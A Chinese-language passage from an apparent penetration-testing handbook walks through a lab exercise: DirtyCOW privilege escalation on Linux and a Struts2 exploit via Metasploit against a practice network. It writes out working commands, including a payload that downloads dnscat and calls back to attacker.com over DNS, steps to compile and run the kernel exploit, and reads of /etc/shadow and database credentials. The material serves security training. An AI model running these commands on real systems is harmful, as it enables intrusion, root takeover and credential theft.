在获得系统的信息后，我们会尝试利用这些漏洞。如果在服务和定时任务中找不到任何粘滞位漏洞或错误配置漏洞，那么我们会查找系统/应用程序的漏洞。我尝试发现漏洞，最终总是有可能突破的设备。
我们可以运行一个名为inux-exploit-suggester的工具，分析主机系统，识别未打的补丁和存在的漏洞。一旦发现漏洞，该工具还将提供PoC漏洞利用工具的链接，如图4.48所示。
图4.48
现在，我们还要寻找什么漏洞？这时实践经验就真正发挥作用了。在我的“实验室”中，我配置大量不同的Linux版本，验证这些漏洞是否会导致底层系统崩溃。在这个场景中，我最愿意研究的漏洞之一是DirtyCOW。
DirtyCOW漏洞的描述：Linux内核的内存子系统在处理写入只读私有映射地址时，出现了资源竞争。非特权本地用户利用这个漏洞，获取对其他只读内存映射的写访问权，从而实现了权限提升。
简而言之，此漏洞允许攻击者通过内核漏洞，从非特权用户提升到root用户。这是我们想要实现的权限提升方式！但问题是，这种方式容易引起内核崩溃，因此必须确保在正确的Linux内核上使用正确的工具版本。
在Ubuntu中测试DirtyCOW（ubuntu 14.04.1 LTS 3.13.0-32-generic x86_64）。
下载DirtyCOW静荷。 
wget http://bit.ly/2vdh2Ub -O dirtycow-mem.c
编译DirtyCOW静荷。 
gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread
运行DirtyCOW获取系统权限。 
./dirtycow-mem
关闭定期回写机制，确保漏洞稳定性。 
echo 0 >/proc/sys/vm/dirty_writeback_centisecs
尝试读取shadow文件。 
cat /etc/shadow
4.13 Linux横向迁移实验室
横向迁移的问题在于，如果没有搭建迁移的网络环境，则很难进行练习。因此，我们将为您介绍网络空间猫安全实验室。在这个实验室中，您可以在设备之间进行迁移，使用最新的漏洞进行权限提升攻击，所有操作均在Linux环境中完成。
搭建虚拟环境
虚拟环境实验室的设置稍微复杂一些，这是因为网络需要运行3个不同的静态虚拟机，并且需要进行一些提前的设置。所有这些都在VMWare Workstation和VMware Fusion环境中进行了测试，因此，如果您使用的是VirtualBox，则可能需要先进行测试。
下载3台虚拟机。
虽然您不需要这些设备的root账户，但这里给出用户名/密码：hacker/changeme。
所有这 3 个虚拟机都配置为使用NAT网络接口。要使此实验室正常工作，您必须在VMWare中配置虚拟机的NAT设置，使用172.16.250.0/24网络。注意，需要在Windows VMWare Workstation中执行此操作。
在菜单栏中，转到编辑→虚拟网络编辑器→更改设置。
选择NAT类型的接口（我的是VMnet8）。
更改子网IP 172.16.250.0并单击申请。
在macOS操作系统中，设置更为复杂，您需要执行以下步骤。
复制原始dhcpd.conf，作为备份。 
sudo cp /Library/Preferences/VMware\Fusion/vmnet8/dhcpd.conf/Library/ Preferences/ VMware\Fusion/vmnet8/dhcpd.conf.bakup
编辑dhcpd.conf文件，使用172.16.250.x而不是192.168.x.x.网络。 
sudo vi /Library/Preferences/VMware\Fusion/vmnet8/dhcpd.conf
编辑nat.conf，使用正确的网关。 
sudo vi /Library/Preferences/VMware \ Fusion/vmnet8/nat.conf
# NAT gateway address
ip= 172.16.250.2
netmask= 255.255.255.0
重启服务。 
sudo/Applications/VMware\Fusion.app/Contents/Library/services/services.sh --stop
sudo/Applications/VMware\Fusion.app/Contents/Library/services/services.sh --start
现在，您以NAT模式启动THP Kali虚拟机，获得172.16.250.0/24范围内的动态IP地址。如果您愿意，则可以同时启动所有其他3个实验室设备，开启“黑客”征程。
攻击CSK安全网络
您最终已经从Windows环境迁移到安全的生产网络。根据所有的调查和研究数据，您知道所有的秘密都存储在这里。这是受保护较多的网络之一，我们知道其安全基础设施已经进行了隔离。从他们的文档来看，有多个虚拟局域网需要突破，设备之间需要迁移，从而进入数据库。这就是您“训练”过的一切……
迁移到安全网络区域的外部，您看到这个网络配置为172.16.250.0/24。由于对这个网络知之甚少，因此首先要开始进行一些非常轻量级的Nmap扫描。您需要了解从网络外部可以访问这个网络的哪些系统，从而确定如何开始攻击。
扫描安全网络：
nmap 172.16.250.0/24
您注意到有3个设备正在运行，但只有一个设备开启了网站端口。看起来其他两个设备是与安全网络的外部网络隔离的，这意味着我们必须先突破172.16.250.10设备，才能迁移进入其他两个服务器。访问第一个设备（172.16.250.10），您会看到Apache Tomcat正在监听端口8080，而某些openCMS正在端口80上运行。运行网站模糊测试工具，您注意到openCMS页面也在运行Apache Struts2（/struts2-showcase），如图4.49所示。瞬间，Equifax漏洞的闪回就像砖块一样击中您。您或许认为这太走运了，但无论如何您必须进行尝试。您在msfconsole上运行快速搜索，测试漏洞“struts2_content_ type_ognl”。
图4.49
我们知道CSK会严密监控其受保护的网络流量，其内部服务器可能无法直接访问公司的网络。为了解决这个问题，我们使用DNS 命令和控制静荷，协议采用UDP而不是TCP。当然，在真实情况下，我们可能会使用权威的DNS服务器，但是在实验室，我们选择自己的DNS服务器。
[THP Kali虚拟机]
THP Kali自定义虚拟机提供所有工具，实现此次攻击，如图4.50所示。
图4.50
由于我们需要在网站服务器上托管静荷，因此Metasploit静荷能够获取dnscat恶意软件。在dnscat2客户端文件夹中是dnscat二进制文件。 
cd /opt/dnscat2/client/
python -m SimpleHTTPServer 80
启动dnscat服务器。 
cd /opt/dnscat2/server/
ruby ./dnscat2.rb
记录dnscat密钥。
打开新的终端，加载Metasploit。 
msfconsole
搜索struts2，加载struts2漏洞工具。 
search struts2
use exploit/multi/http/struts2_content_type_ognl
配置struts2 漏洞，获取dnscat静荷并在被攻击者服务器上执行。确保在这之前，更新您的IP地址和密钥，如图4.51所示。 
set RHOST 172.16.250.10
set RPORT 80
set TARGETURI struts2-showcase/showcase.action
set PAYLOAD cmd/unix/generic
set CMD wget http:///dnscat -O /tmp/dnscat && chmod +x /tmp/dnscat && /tmp/dnscat --dns server=attacker.com,port=53 --secret=
run
图4.51
静荷执行后，在Metasploit中您将无法获得任何类型的确认，因为使用了dnscat静荷。您将需要检查dnscat服务器，查看DNS流量的连接。
回到dnscat2服务器，检查新执行的静荷，并创建Shell终端，如图4.52所示。 
与您的第一个静荷交互
window -i 1
复制Shell进程
shell
使用键盘按键返回主菜单
Ctrl+ Z
与新Shell进行交互
window -i 2
输入Shell命令
ls
图4.52
您已经突破了OpenCMS/Apache Struts服务器！现在怎么办？您花了一些时间了解服务器，查找各种“秘密”。您记得服务器正在运行OpenCMS网站应用程序，并确定该应用程序是在/opt/tomcat/webapps/kittens下配置的。在查看OpenCMS属性的配置文件时，我们找到了数据库、用户名、密码和IP地址172.16.250.10。
检索数据库信息，如图4.53所示。
cat /opt/tomcat/webapps/kittens/WEB-INF/config/opencms.properties
图4.53
我们连接到数据库，但并没有发现太多有用的信息。问题是我们目前是一个受限的Tomcat用户，这实际上阻碍了进一步的攻击。因此，我们需要找到提升权限的方法。在服务器上运行后漏洞侦察工具（uname -a && lsb_release -a），您发现这是一个非常古老的Ubuntu版本。但是，这个服务器存在DirtyCOW权限提升漏洞。我们创建一个DirtyCOW二进制文件并获取root权限！
通过dnscat进行权限提升，如图4.54所示。
下载并编译DirtyCOW工具。 
cd /tmp
wget http://bit.ly/2vdh2Ub -O dirtycow-mem.c
gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread
./dirtycow-mem
尝试DirtyCOW漏洞工具，在内核恐慌时，允许重启。 
echo 0 >/proc/sys/vm/dirty_writeback_centisecs
echo 1 >/proc/sys/kernel/panic && echo 1 > /proc/sys/kernel/panic_on_oops&& echo 1 > /proc/sys/kernel/panic_on_unrecovered_nmi && echo 1 > /proc/sys/kernel/panic_on_io_nmi && echo 1 > /proc/sys/kernel/panic_on_warn